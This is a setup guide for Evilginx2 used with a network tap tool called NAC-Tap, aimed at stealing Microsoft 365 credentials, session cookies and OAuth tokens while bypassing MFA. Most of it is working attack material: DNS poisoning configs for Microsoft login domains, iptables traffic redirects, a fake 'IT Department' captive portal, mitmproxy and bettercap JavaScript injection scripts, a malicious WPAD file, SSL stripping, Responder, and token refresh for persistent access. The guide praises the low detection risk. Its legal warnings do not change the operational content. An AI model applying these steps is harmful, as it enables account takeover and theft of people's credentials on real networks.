# Evilginx2 Installation & Setup

Complete guide for installing and configuring Evilginx2 with NAC-Tap MITM Edition.

## Prerequisites

- Go 1.19 or higher
- Root access
- Working DNS control or ability to perform DNS poisoning

## Installation

### 1. Install Go (if not already installed)

```bash
# Download and install Go
cd /tmp
wget https://go.dev/dl/go1.21.0.linux-arm64.tar.gz
sudo tar -C /usr/local -xzf go1.21.0.linux-arm64.tar.gz

# Add to PATH (add to ~/.bashrc for persistence)
export PATH=$PATH:/usr/local/go/bin
export GOPATH=$HOME/go
export PATH=$PATH:$GOPATH/bin
```

### 2. Clone and Build Evilginx2

```bash
# Create directory
sudo mkdir -p /opt/evilginx2
cd /opt/evilginx2

# Clone repository
sudo git clone https://github.com/kgretzky/evilginx2.git .

# Build from source
sudo go build -o evilginx main.go

# Verify installation
sudo /opt/evilginx2/evilginx -h
```

### 3. Configure Permissions

```bash
# Allow binary to bind to privileged ports
sudo setcap CAP_NET_BIND_SERVICE=+eip /opt/evilginx2/evilginx

# Create phishlets directory (if not exists)
sudo mkdir -p /opt/evilginx2/phishlets
```

### 4. Verify Phishlets

Check that Microsoft phishlets are available:

```bash
# List available phishlets
ls /opt/evilginx2/phishlets/

# Should see:
# - o365.yaml
# - outlook.yaml
# - microsoft.yaml
```

If Microsoft phishlets are missing, download them manually:

```bash
cd /opt/evilginx2/phishlets
sudo wget https://raw.githubusercontent.com/kgretzky/evilginx2/master/phishlets/o365.yaml
sudo wget https://raw.githubusercontent.com/kgretzky/evilginx2/master/phishlets/outlook.yaml
```

## Configuration for NAC-Tap

### 1. DNS Setup

For Evilginx to work, victims must resolve your fake domain to the bridge IP (10.200.66.1).

**Option A: Local DNS Poisoning (Recommended)**

Use `dnsspoof` or `bettercap` on the NAC device:

```bash
# Install dnsmasq for local DNS
sudo apt install dnsmasq

# Configure /etc/dnsmasq.conf
echo "address=/login.microsoft-sso.com/10.200.66.1" | sudo tee -a /etc/dnsmasq.conf
sudo systemctl restart dnsmasq
```

Then use MITM intercept for DNS (port 53 UDP) to redirect victim queries.

**Option B: External DNS Control**

If you control a domain, add an A record:

```
login.your-domain.com  →  10.200.66.1
```

### 2. SSL Certificates

Evilginx uses Let's Encrypt automatically for HTTPS, but on a local network, you'll need to:

1. **Use HTTP-only mode** (less effective, no SSL)
2. **Install a self-signed CA** on the victim device
3. **Use a legitimate domain** with Let's Encrypt

For testing, victims may need to accept certificate warnings.

## Usage with NAC-Tap

### 1. Start NAC-Tap

```bash
sudo python3 /opt/nac-tap/nac-tap.py
```

### 2. Access Web Interface

```
http://10.200.66.1:8080
```

### 3. Enable MITM Mode

1. Go to **MITM** tab
2. Click **Enable MITM**
3. Wait for victim identification (30s)

### 4. Intercept HTTPS Traffic

To allow Evilginx to receive HTTPS requests:

```bash
# Redirect port 443 to bridge IP
sudo iptables -t nat -A PREROUTING -i br0 -p tcp --dport 443 -j DNAT --to 10.200.66.1:443
sudo iptables -t nat -A PREROUTING -i br0 -p tcp --dport 80 -j DNAT --to 10.200.66.1:80
```

Or use the web interface **Evilginx** category intercept.

### 5. Start Evilginx via Web Interface

1. Go to **Evilginx** tab
2. (Optional) Enter custom domain or leave blank for `o365.local`
3. Click **Start O365** or **Start Outlook**
4. Share the **Lure URL** with victims

### 6. Monitor Captured Sessions

- Sessions appear automatically in the **Evilginx** tab
- Sessions include:
  - Username
  - Cookies
  - OAuth tokens
  - Session timestamp

## Session Extraction

Captured cookies and tokens are saved to:

```
/var/log/nac-captures/evilginx_sessions.json
```

### Manual Session Extraction

```bash
# View Evilginx database directly
sqlite3 /var/log/nac-captures/evilginx.db

# Query sessions
SELECT * FROM sessions WHERE captured = 1;
```

### Export from Web Interface

1. Go to **Evilginx** tab
2. Click **Export Sessions (JSON)**
3. Download complete session data including cookies and tokens

## Forced Authentication - No Phishing Required

Instead of sending a phishing link and waiting for the user to click, you can **force** authentication prompts to appear automatically using DNS poisoning and trigger mechanisms.

### Method 1: DNS Hijacking + Browser Auto-Redirect

**Concept**: Poison DNS to redirect legitimate Microsoft domains to your Evilginx server.

**Setup**:

```bash
# 1. Enable DNS interception on NAC-Tap
# In web UI: MITM tab → Intercept "Name Resolution" (DNS port 53)

# 2. Setup local DNS server (dnsmasq)
sudo apt install dnsmasq

# Edit /etc/dnsmasq.conf
cat << 'EOF' | sudo tee /etc/dnsmasq.conf
# Listen on bridge interface
interface=br0
bind-interfaces

# Redirect Microsoft auth domains to Evilginx
address=/login.microsoftonline.com/10.200.66.1
address=/login.live.com/10.200.66.1
address=/account.microsoft.com/10.200.66.1
address=/portal.office.com/10.200.66.1

# Pass through other DNS queries to real DNS
server=8.8.8.8
EOF

# Restart dnsmasq
sudo systemctl restart dnsmasq

# 3. Redirect DNS queries to dnsmasq
sudo iptables -t nat -A PREROUTING -i br0 -p udp --dport 53 -j DNAT --to 10.200.66.1:53
```

**Result**: 
- When victim's device tries to access any Microsoft service
- DNS resolves to your Evilginx server (10.200.66.1)
- Victim sees "legitimate" Microsoft login page
- Evilginx proxies authentication to real Microsoft
- Cookies/tokens captured automatically

### Method 2: Captive Portal Simulation

**Concept**: Block all HTTPS traffic and redirect to a fake "network authentication required" page that triggers Microsoft SSO.

**Setup**:

```bash
# 1. Block all HTTPS initially
sudo iptables -t nat -A PREROUTING -i br0 -p tcp --dport 443 -j DNAT --to 10.200.66.1:8443

# 2. Create captive portal landing page at 10.200.66.1:8443
# This page displays: "Corporate Network Authentication Required"
# Button: "Sign in with Microsoft 365"
# Clicking button redirects to Evilginx lure URL
```

**HTML for Captive Portal** (`/var/www/captive.html`):

```html
<!DOCTYPE html>
<html>
<head>
<title>Network Authentication Required</title>
<style>
body{font-family:Arial;text-align:center;padding:50px;background:#f5f5f5}
.box{background:#fff;padding:40px;border-radius:8px;max-width:500px;margin:0 auto;box-shadow:0 2px 10px rgba(0,0,0,0.1)}
h1{color:#0078d4;margin-bottom:20px}
.btn{background:#0078d4;color:#fff;padding:15px 30px;border:none;border-radius:4px;font-size:16px;cursor:pointer;text-decoration:none;display:inline-block;margin-top:20px}
.btn:hover{background:#005a9e}
</style>
</head>
<body>
<div class="box">
<img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 23 23'%3E%3Cpath fill='%23f25022' d='M0 0h11v11H0z'/%3E%3Cpath fill='%237fba00' d='M12 0h11v11H12z'/%3E%3Cpath fill='%2300a4ef' d='M0 12h11v11H0z'/%3E%3Cpath fill='%23ffb900' d='M12 12h11v11H12z'/%3E%3C/svg%3E" width="80" style="margin-bottom:20px">
<h1>Corporate Network Authentication Required</h1>
<p>To access the network, please authenticate with your Microsoft 365 account.</p>
<a href="http://login.microsoftonline.com/" class="btn">Sign in with Microsoft 365</a>
<p style="margin-top:30px;font-size:12px;color:#999">Your IT Department</p>
</div>
<script>
// Auto-redirect after 3 seconds
setTimeout(function(){
  window.location.href = 'http://login.microsoftonline.com/';
}, 3000);
</script>
</body>
</html>
```

**Result**: Victim connects to network, sees "authentication required", clicks or is auto-redirected to Evilginx.

### Method 3: WebDAV/UNC Path Auto-Trigger

**Concept**: Force Windows to automatically attempt authentication by injecting UNC paths or WebDAV links.

**Technique A - SMB File Share Popup**:

```bash
# 1. Inject fake SMB share notification
# When victim browses any HTTP site, inject JavaScript:

<script>
// Create hidden iframe with UNC path
var frame = document.createElement('iframe');
frame.style.display = 'none';
frame.src = '\\\\10.200.66.1\\share\\document.docx';
document.body.appendChild(frame);
</script>
```

**Technique B - WebDAV Trigger**:

```bash
# Inject link that forces WebDAV authentication
<script>
window.location = 'http://login.microsoftonline.com@10.200.66.1/';
</script>
```

**Implementation**: Use `mitmproxy` or `bettercap` to inject JavaScript into HTTP traffic:

```bash
# Install mitmproxy
sudo apt install mitmproxy

# Create injection script (inject-auth.py)
cat << 'EOF' > /tmp/inject-auth.py
from mitmproxy import http

def response(flow: http.HTTPFlow) -> None:
    if "text/html" in flow.response.headers.get("content-type", ""):
        injection = b'''
        <script>
        setTimeout(function(){
            var a = document.createElement('a');
            a.href = 'http://login.microsoftonline.com/';
            a.style.display = 'none';
            document.body.appendChild(a);
            a.click();
        }, 2000);
        </script>
        '''
        flow.response.content = flow.response.content.replace(b'</body>', injection + b'</body>')
EOF

# Run mitmproxy with injection
sudo mitmproxy -s /tmp/inject-auth.py --mode transparent --listen-host 10.200.66.1 --listen-port 8080
```

**Result**: Any HTTP page visited automatically opens Microsoft login in background/popup.

### Method 4: Browser Popup Injection (HTTP Only)

**Concept**: Inject JavaScript into unencrypted HTTP traffic to open Microsoft login popup automatically.

**Using Bettercap**:

```bash
# Install bettercap
sudo apt install bettercap

# Create injection caplet (ms-popup.cap)
cat << 'EOF' > /tmp/ms-popup.cap
set http.proxy.script /tmp/inject.js
http.proxy on
EOF

# Create injection JavaScript
cat << 'EOF' > /tmp/inject.js
function onResponse(req, res) {
  if (res.ContentType.indexOf('text/html') == 0) {
    var body = res.ReadBody();
    var inject = `
      <script>
      (function() {
        var w = window.open('http://login.microsoftonline.com/', 'auth', 'width=500,height=600');
        if (!w) {
          window.location.href = 'http://login.microsoftonline.com/';
        }
      })();
      </script>
    `;
    res.Body = body.replace('</head>', inject + '</head>');
  }
}
EOF

# Run bettercap
sudo bettercap -iface br0 -caplet /tmp/ms-popup.cap
```

**Result**: Every HTTP page the victim visits triggers a Microsoft login popup window.

### Method 5: WPAD/Proxy Auto-Config Hijacking

**Concept**: Hijack WPAD (Web Proxy Auto-Discovery) to force browser through malicious proxy that redirects Microsoft domains.

**Setup**:

```bash
# 1. Respond to WPAD DHCP requests
# In /etc/dhcp/dhcpd.conf:
option wpad code 252 = text;
option wpad "http://10.200.66.1/wpad.dat";

# 2. Create malicious PAC file
cat << 'EOF' > /var/www/html/wpad.dat
function FindProxyForURL(url, host) {
  // Redirect Microsoft auth domains through our proxy
  if (shExpMatch(host, "*.microsoftonline.com") ||
      shExpMatch(host, "*.live.com") ||
      shExpMatch(host, "login.microsoft.com") ||
      shExpMatch(host, "account.microsoft.com")) {
    return "PROXY 10.200.66.1:8080";
  }
  return "DIRECT";
}
EOF

# 3. Setup transparent proxy that redirects to Evilginx
sudo iptables -t nat -A PREROUTING -i br0 -p tcp --dport 80 -j REDIRECT --to-port 8080
```

**Result**: Browser auto-configures proxy, all Microsoft auth goes through your proxy to Evilginx.

### Method 6: OAuth Application Trigger

**Concept**: Use legitimate Microsoft OAuth endpoints to force authentication dialog.

**Technique**:

```bash
# Inject redirect to OAuth consent screen
<script>
window.location = 'https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=00000003-0000-0000-c000-000000000000&response_type=code&redirect_uri=http://10.200.66.1/callback&scope=openid%20profile%20email';
</script>
```

**With DNS poisoning**, this redirects to your Evilginx server while appearing legitimate.

## Complete Attack Flow (No User Interaction)

**Optimal Configuration**:

1. **Enable MITM Mode** (NAC-Tap Web UI)
   - Learns victim MAC/IP automatically

2. **DNS Poisoning** (Method 1)
   ```bash
   # Redirect all Microsoft auth domains
   sudo iptables -t nat -A PREROUTING -i br0 -p udp --dport 53 -j DNAT --to 10.200.66.1:53
   ```

3. **Start Evilginx** with O365 phishlet using **real Microsoft domain**:
   ```bash
   # In Web UI: Domain = "login.microsoftonline.com"
   # This makes Evilginx respond to the poisoned DNS
   ```

4. **HTTP Injection** (Method 4)
   ```bash
   # Inject popup trigger into HTTP traffic
   sudo bettercap -iface br0 -caplet /tmp/ms-popup.cap
   ```

5. **Wait for Trigger**:
   - Victim browses any HTTP site
   - JavaScript injection opens Microsoft login popup
   - DNS points to your Evilginx (10.200.66.1)
   - Victim sees "legitimate" Microsoft login
   - Enters credentials + MFA
   - **Session captured automatically**

## Attack Scenarios

### Scenario 1: Zero-Interaction O365 Capture

**Prerequisites**:
- NAC-Tap with MITM enabled
- DNS poisoning active
- HTTP injection running
- Evilginx started with `login.microsoftonline.com` domain

**Flow**:
1. ✅ Victim connects through NAC tap
2. ✅ DNS queries for Microsoft services resolve to 10.200.66.1
3. ✅ Victim opens Chrome/Edge (any HTTP site)
4. ✅ Injected JavaScript opens Microsoft login popup
5. ✅ Victim thinks: "Must be Office 365 session expired"
6. ✅ Enters credentials + MFA (proxied to real Microsoft)
7. ✅ Evilginx captures session cookies & OAuth tokens
8. ✅ Victim successfully logs in (no suspicion)
9. ✅ Attacker imports cookies → Full account access

**Detection Risk**: Very Low
- No phishing email to report
- Victim visits real Microsoft domains (via DNS)
- Legitimate SSL certificate (if using valid domain + Let's Encrypt)
- Appears as normal session expiration

### Scenario 2: Captive Portal Attack

**Best for**: Public WiFi, Guest networks, Corporate lobbies

1. ✅ Setup NAC-Tap as WiFi AP (using setup-wifi-ap.sh)
2. ✅ Block all HTTPS initially with iptables
3. ✅ Show captive portal: "Sign in with Microsoft 365"
4. ✅ Auto-redirect to Evilginx after 3 seconds
5. ✅ Capture credentials

**Advantage**: Victim expects authentication on new network.

### Scenario 3: Combined SMB + OAuth Capture

**Maximum credential harvesting**:

1. Enable MITM
2. Intercept **SMB** + **Name Resolution** (LLMNR/mDNS)
3. Intercept **DNS** (port 53)
4. Start Evilginx
5. Start Responder for SMB
6. Enable HTTP injection

**Captured**:
- ✅ NTLM hashes (Responder)
- ✅ Plaintext passwords (PCredz)
- ✅ OAuth tokens + session cookies (Evilginx)

### Scenario 4: Persistent Access via Token Refresh

After capturing OAuth tokens:

```bash
# Extract refresh token from Evilginx session
jq -r '.sessions[0].tokens' /var/log/nac-captures/evilginx_sessions.json

# Use refresh token to get new access tokens
curl -X POST https://login.microsoftonline.com/common/oauth2/v2.0/token \
  -d "client_id=..." \
  -d "refresh_token=..." \
  -d "grant_type=refresh_token"
```

**Result**: Persistent access even after victim changes password (until token revoked).

## Implementation Notes

### DNS Poisoning Best Practices

**Option 1: dnsmasq (Recommended)**
- Fast, reliable, easy configuration
- Supports wildcard domains
- Low resource usage

**Option 2: dnsspoof**
```bash
sudo apt install dsniff
sudo dnsspoof -i br0 'host login.microsoftonline.com'
```

**Option 3: Bettercap DNS spoofer**
```bash
sudo bettercap -iface br0
> set dns.spoof.domains login.microsoftonline.com,login.live.com
> set dns.spoof.address 10.200.66.1
> dns.spoof on
```

### JavaScript Injection Tools Comparison

| Tool | Pros | Cons |
|------|------|------|
| **Bettercap** | Easy, built-in caplets, great for beginners | Less flexible |
| **mitmproxy** | Very flexible, Python scripting, SSL intercept | Complex setup |
| **ettercap** | Classic tool, well-documented | Outdated, slow |

### SSL/HTTPS Considerations

**Problem**: HTTPS traffic can't be injected or read without SSL stripping.

**Solutions**:

1. **Target HTTP sites only** (declining but still exist)
   - Bank login pages often start HTTP then upgrade
   - Internal corporate sites
   - IoT device web interfaces

2. **SSL Stripping** (sslstrip)
   ```bash
   sudo apt install sslstrip
   sudo iptables -t nat -A PREROUTING -i br0 -p tcp --dport 80 -j REDIRECT --to-port 8080
   sudo sslstrip -l 8080
   ```
   Downgrades HTTPS to HTTP for injection.

3. **Certificate Installation**
   - Install root CA on victim device
   - Only works if you have prior access
   - Defeats HTTPS protections

4. **DNS Poisoning Only**
   - Don't inject JavaScript
   - Rely on legitimate Microsoft redirects
   - Example: `portal.office.com` → DNS points to Evilginx
   - User types URL normally, gets phished

**Recommended**: DNS poisoning without injection (most stealthy).

## Legal & Ethical Considerations

⚠️ **CRITICAL WARNING**

The techniques described in this document can:
- Bypass MFA and capture full account access
- Violate computer fraud laws (CFAA in US)
- Breach privacy regulations (GDPR, etc.)
- Constitute identity theft
- Result in criminal prosecution

**Legal Use Cases ONLY**:
- ✅ Authorized penetration testing with signed contract
- ✅ Red team exercises with written approval
- ✅ Security research in isolated lab environments
- ✅ Training on your own test infrastructure

**NEVER**:
- ❌ Use on networks without explicit authorization
- ❌ Capture real user credentials without consent
- ❌ Access accounts that aren't yours
- ❌ Deploy on public WiFi/networks

**Always**:
- Get written permission before ANY testing
- Document scope and boundaries
- Use test accounts when possible
- Report findings responsibly
- Follow responsible disclosure

## Troubleshooting

### Evilginx Won't Start

```bash
# Check if Evilginx binary exists
ls -lh /opt/evilginx2/evilginx

# Check permissions
getcap /opt/evilginx2/evilginx

# Test manual start
sudo /opt/evilginx2/evilginx -p /opt/evilginx2/phishlets -d /tmp/test.db
```

### No Sessions Captured

- Verify DNS is pointing to 10.200.66.1
- Check iptables rules for port 80/443 redirect
- Ensure victim is accessing the lure URL (not real Microsoft)
- Check `/var/log/nac-captures/evilginx.log` for errors

### Certificate Warnings

Victims will see SSL warnings if:
- Using self-signed certificates
- Domain doesn't match
- Let's Encrypt failed

This is expected on local networks. For production attacks, use a legitimate domain.

## Security & Legal Warning

⚠️ **WARNING**: Evilginx2 captures authentication credentials and bypasses MFA.

- This tool is for **authorized penetration testing only**
- Unauthorized use is **illegal** in most jurisdictions
- Always get **written permission** before testing
- Use only in controlled lab environments

## Advanced Configuration

### Custom Phishlets

Create custom phishlets in `/opt/evilginx2/phishlets/`:

```yaml
# example: custom-app.yaml
name: 'custom-app'
author: 'Your Name'
min_ver: '3.0.0'

proxy_hosts:
  - {phish_sub: 'login', orig_sub: 'login', domain: 'example.com', is_landing: true}

sub_filters:
  - {hostname: 'example.com', sub: '', domain: 'example.com'}

auth_tokens:
  - domain: '.example.com'
    keys: ['session_token']

credentials:
  username:
    key: 'username'
  password:
    key: 'password'
```

### Persistent Configuration

To make Evilginx settings persistent, modify:

```bash
/var/log/nac-captures/evilginx-config/config.yaml
```

### Integration with Responder

For maximum credential capture, run Responder alongside Evilginx:

```bash
sudo responder -I br0 -wFv
```

This captures:
- **NTLM hashes** → Responder
- **Plaintext passwords** → PCredz
- **OAuth tokens** → Evilginx

## Database Schema

Evilginx uses SQLite. Key tables:

```sql
-- Sessions table
CREATE TABLE sessions (
    id INTEGER PRIMARY KEY,
    phishlet TEXT,
    username TEXT,
    password TEXT,
    tokens TEXT,
    cookies TEXT,
    create_time INTEGER,
    update_time INTEGER,
    captured INTEGER
);

-- Lures table
CREATE TABLE lures (
    id INTEGER PRIMARY KEY,
    phishlet TEXT,
    path TEXT,
    redirect_url TEXT,
    og_title TEXT,
    og_desc TEXT,
    og_image TEXT
);
```

## File Locations

| File | Purpose |
|------|---------|
| `/opt/evilginx2/evilginx` | Main binary |
| `/opt/evilginx2/phishlets/` | Phishlet templates |
| `/var/log/nac-captures/evilginx.db` | Session database |
| `/var/log/nac-captures/evilginx_sessions.json` | Exported sessions |
| `/var/log/nac-captures/evilginx.log` | Evilginx logs |
| `/var/log/nac-captures/evilginx-config/` | Configuration |

## References

- Evilginx2 GitHub: https://github.com/kgretzky/evilginx2
- Official Docs: https://help.evilginx.com
- Phishlet Development: https://help.evilginx.com/docs/phishlet-format

---

**Last Updated**: November 2025

